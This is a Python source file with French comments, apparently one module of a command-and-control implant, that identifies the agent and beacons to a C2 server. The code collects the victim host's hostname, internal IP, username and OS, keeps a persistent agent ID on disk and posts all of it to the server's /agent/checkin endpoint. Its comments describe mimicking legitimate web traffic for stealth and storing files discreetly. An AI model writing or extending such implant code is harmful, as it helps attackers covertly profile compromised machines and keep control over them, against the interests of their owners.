# comms/http_beacon.py
# Module de communication pour l'agent utilisant le protocole HTTP/HTTPS.
# Simule le trafic web légitime pour la furtivité.
# Gère le 'jitter' et le 'sleep' pour varier les intervalles de communication.

"""
HTTP Beacon communication for the agent.
"""
import requests
import time
import uuid
import socket # Pour récupérer le hostname
import platform # Pour récupérer des infos OS

# Ce fichier ne devrait plus définir de SERVER_URL global ici.
# Il sera passé par agent_main.py

AGENT_ID_FILE = "agent_id.txt" # Peut être stocké dans un endroit plus discret

def get_agent_id():
    """Récupère ou génère un ID unique pour l'agent."""
    try:
        with open(AGENT_ID_FILE, "r") as f:
            agent_id = f.read().strip()
            if agent_id:
                return agent_id
    except FileNotFoundError:
        pass # Le fichier n'existe pas, générer un nouvel ID
    
    agent_id = str(uuid.uuid4())
    try:
        with open(AGENT_ID_FILE, "w") as f:
            f.write(agent_id)
    except IOError:
        # Si on ne peut pas écrire, on utilisera l'ID en mémoire pour cette session
        print(f"Avertissement: Impossible d'écrire le fichier agent_id ({AGENT_ID_FILE}). L'ID sera temporaire.")
        pass 
    return agent_id

def get_host_info():
    """Récupère des informations basiques sur l'hôte."""
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown_hostname"
    
    try:
        # Tente de récupérer l'IP locale (peut être complexe et multi-interfaces)
        # Ceci est une méthode simple, pourrait ne pas être la bonne IP externe/pertinente
        internal_ip = socket.gethostbyname(hostname) 
    except socket.gaierror:
        internal_ip = "127.0.0.1" # Fallback

    os_target = f"{platform.system()} {platform.release()}"
    # Username pourrait être récupéré avec getpass.getuser() mais nécessite une gestion des erreurs
    # ou des méthodes spécifiques à l'OS pour les contextes de service.
    username = "unknown_user" # Placeholder
    try:
        import getpass
        username = getpass.getuser()
    except Exception:
        pass # Garder unknown_user si getpass échoue
        
    return {
        "hostname": hostname,
        "internal_ip": internal_ip,
        "username": username,
        "os_target": os_target
        # "agent_version": "0.1.0" # Peut être ajouté ici ou dans agent_main
    }

def send_checkin(server_url: str, agent_id: str, agent_info: dict):
    """Envoie une requête de check-in au serveur C2."""
    checkin_url = f"{server_url.rstrip('/')}/agent/checkin"
    payload = {
        "agent_id": agent_id,
        "timestamp": time.time(), # Le serveur génère first_seen et last_checkin
        **agent_info # Intégrer les autres infos de l'agent
    }
    try:
        response = requests.post(checkin_url, json=payload, timeout=10)
        response.raise_for_status() 
        print(f"Agent {agent_id} check-in réussi sur {server_url}. Réponse: {response.json()}")
        return response.json()
    except requests.exceptions.Timeout:
        print(f"Timeout lors du check-in de l'agent {agent_id} à {checkin_url}.")
    except requests.exceptions.ConnectionError:
        print(f"Erreur de connexion lors du check-in de l'agent {agent_id} à {checkin_url}. Serveur C2 inaccessible ?")
    except requests.exceptions.RequestException as e:
        print(f"Erreur lors du check-in de l'agent {agent_id}: {e}")
    return None

# Le bloc if __name__ == "__main__" est moins pertinent ici car le beacon sera appelé par agent_main.py
# On peut le garder pour un test unitaire rapide si besoin.
if __name__ == "__main__":
    print("Test direct de http_beacon.py...")
    test_server_url = "http://localhost:8000" # Pour test uniquement
    my_agent_id = get_agent_id()
    print(f"ID Agent: {my_agent_id}")
    host_info = get_host_info()
    print(f"Informations de l'hôte: {host_info}")
    
    print(f"Envoi d'un check-in test à {test_server_url}...")
    send_checkin(test_server_url, my_agent_id, host_info)
